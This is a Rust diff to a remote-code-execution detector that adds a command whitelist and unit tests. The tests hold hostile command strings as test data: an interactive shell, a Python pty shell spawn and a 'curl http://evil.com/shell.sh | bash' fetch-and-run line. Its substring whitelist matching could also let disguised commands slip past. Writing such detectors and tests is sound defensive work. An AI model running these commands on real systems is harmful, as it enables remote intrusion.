@@ -68,6 +68,11 @@ impl RceDetector {
                             child_comm.as_deref(),
                             &raw_cmd,
                         ) {
+                            // Ignora comandos que contenham padrões permitidos explicitamente na whitelist
+                            if self.is_allowed_child(&raw_cmd) {
+                                continue;
+                            }
+
                             let child_cmd: String = raw_cmd
                                 .chars()
                                 .map(|c| {
@@ -82,7 +87,7 @@ impl RceDetector {
                             let parent_name = parent_comm
                                 .or_else(|| {
                                     parent_exe
-                                        .and_then(|p| p.split('/').last().map(|s| s.to_string()))
+                                        .and_then(|p| p.split('/').next_back().map(|s| s.to_string()))
                                 })
                                 .unwrap_or_else(|| format!("PID:{}", ppid));
 
@@ -118,7 +123,7 @@ impl RceDetector {
                 }
             }
             if let Some(e) = exe {
-                let binary_name = e.split('/').last().unwrap_or(e);
+                let binary_name = e.split('/').next_back().unwrap_or(e);
                 if binary_name == protected
                     || binary_name.starts_with(protected)
                     || e.contains(protected)
@@ -131,7 +136,7 @@ impl RceDetector {
     }
 
     fn is_forbidden_child(&self, exe: Option<&str>, comm: Option<&str>, cmd: &str) -> bool {
-        let exe_bin = exe.and_then(|e| e.split('/').last()).unwrap_or("");
+        let exe_bin = exe.and_then(|e| e.split('/').next_back()).unwrap_or("");
         let exe_path = exe.unwrap_or("");
         let comm_str = comm.unwrap_or("");
 
@@ -139,9 +144,8 @@ impl RceDetector {
             let f = forbidden.as_str();
 
             // 1. Wildcard pattern (e.g. /usr/bin/python*, nc*)
-            if f.ends_with('*') {
-                let prefix = &f[..f.len() - 1];
-                let prefix_bin = prefix.split('/').last().unwrap_or(prefix);
+            if let Some(prefix) = f.strip_suffix('*') {
+                let prefix_bin = prefix.split('/').next_back().unwrap_or(prefix);
                 if exe_path.starts_with(prefix)
                     || exe_bin.starts_with(prefix_bin)
                     || comm_str.starts_with(prefix_bin)
@@ -150,7 +154,7 @@ impl RceDetector {
                     return true;
                 }
             } else {
-                let forbidden_bin = f.split('/').last().unwrap_or(f);
+                let forbidden_bin = f.split('/').next_back().unwrap_or(f);
                 if exe_path == f
                     || exe_bin == forbidden_bin
                     || comm_str == forbidden_bin
@@ -162,5 +166,53 @@ impl RceDetector {
             }
         }
         false
+    }
+
+    fn is_allowed_child(&self, cmd: &str) -> bool {
+        for pattern in &self.config.allowed_cmd_patterns {
+            if !pattern.is_empty() && cmd.contains(pattern) {
+                return true;
+            }
+        }
+        false
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::config::RceDetectorConfig;
+
+    #[test]
+    fn test_forbidden_child_detection() {
+        let config = RceDetectorConfig::default();
+        let detector = RceDetector::new(config);
+
+        assert!(detector.is_forbidden_child(Some("/bin/sh"), Some("sh"), "sh -i"));
+        assert!(detector.is_forbidden_child(
+            Some("/usr/bin/python3"),
+            Some("python3"),
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+        ));
+        assert!(!detector.is_forbidden_child(
+            Some("/usr/sbin/sendmail"),
+            Some("sendmail"),
+            "sendmail -t"
+        ));
+    }
+
+    #[test]
+    fn test_allowed_cmd_patterns_whitelist() {
+        let mut config = RceDetectorConfig::default();
+        config.allowed_cmd_patterns = vec!["kong.cmd.init".to_string(), "resty".to_string()];
+        let detector = RceDetector::new(config);
+
+        let kong_cmd = "sh -c -- resty --main-conf '' -e 'require(\"kong.cmd.init\")(\"health\")'";
+        assert!(detector.is_forbidden_child(Some("/bin/sh"), Some("sh"), kong_cmd));
+        assert!(detector.is_allowed_child(kong_cmd));
+
+        let malicious_cmd = "sh -c -- /usr/bin/curl http://evil.com/shell.sh | bash";
+        assert!(detector.is_forbidden_child(Some("/bin/sh"), Some("sh"), malicious_cmd));
+        assert!(!detector.is_allowed_child(malicious_cmd));
     }
 }
